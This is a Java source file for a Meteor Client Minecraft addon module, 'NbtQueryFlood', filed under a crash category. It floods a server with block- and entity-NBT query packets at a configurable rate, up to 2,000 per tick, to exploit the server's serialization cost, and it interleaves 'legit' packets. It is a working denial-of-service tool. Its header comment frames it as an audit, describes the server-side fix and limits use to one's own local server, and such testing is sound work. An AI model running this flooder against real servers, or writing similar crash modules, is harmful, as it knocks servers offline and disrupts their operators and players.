package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.QueryBlockNbtC2SPacket;
import net.minecraft.network.packet.c2s.play.QueryEntityNbtC2SPacket;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.math.BlockPos;

/**
 * AUDIT: NBT Query Flood (asymmetric serialize cost)
 *
 * Floods QueryBlockNbtC2SPacket and QueryEntityNbtC2SPacket. These are tiny to
 * send (an int transaction id + a BlockPos or entity id) but force the server to
 * serialize the ENTIRE block-entity or entity NBT and ship it back — a classic
 * cheap-to-send / expensive-to-process asymmetry. A big block entity (a full
 * shulker, a command block, a sign with long text) or a complex entity makes
 * each query disproportionately costly, and the response is O(payload) outbound.
 *
 * These queries are normally op-gated for command blocks, but the packet is
 * decoded and the target looked up before the permission outcome on many
 * implementations, so an unbounded query rate is a CPU/bandwidth surface
 * regardless of whether the data is ultimately returned.
 *
 * What a vulnerable server does: serializes and returns NBT for every query at
 * any rate, with no per-player budget.
 * What a hardened server does: rate-limits NBT queries per player, gates them
 * behind permission BEFORE serialization, and bounds the response size.
 * Fix: per-player query rate limit at the handler entry; permission check first;
 * cap or refuse oversized NBT responses.
 *
 * Look at a block (and/or an entity), enable. Run against your OWN local server only.
 */
public class NbtQueryFlood extends Module {
    public enum Mode { BLOCK, ENTITY, BOTH }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").description("Query block entities, entities, or both.")
        .defaultValue(Mode.BOTH).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("queries-per-tick").description("NBT query packets per tick (per type when BOTH).")
        .defaultValue(50).range(1, 2000).sliderRange(1, 500).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int txId = 0;

    public NbtQueryFlood() {
        super(AddonTemplate.CRASH_CATEGORY, "nbt-query-flood",
            "Floods block/entity NBT-query packets (cheap to send, expensive to serialize). Tests query rate-limiting + permission ordering.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; txId = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        BlockPos blockPos = (mc.crosshairTarget instanceof BlockHitResult bhr)
            ? bhr.getBlockPos() : mc.player.getBlockPos();
        Entity entity = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : mc.player;
        int entityId = entity != null ? entity.getId() : mc.player.getId();

        for (int i = 0; i < perTick.get(); i++) {
            if (mode.get() != Mode.ENTITY) {
                mc.player.networkHandler.sendPacket(new QueryBlockNbtC2SPacket(txId++, blockPos));
                packetsSent++;
            }
            if (mode.get() != Mode.BLOCK) {
                mc.player.networkHandler.sendPacket(new QueryEntityNbtC2SPacket(txId++, entityId));
                packetsSent++;
            }
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
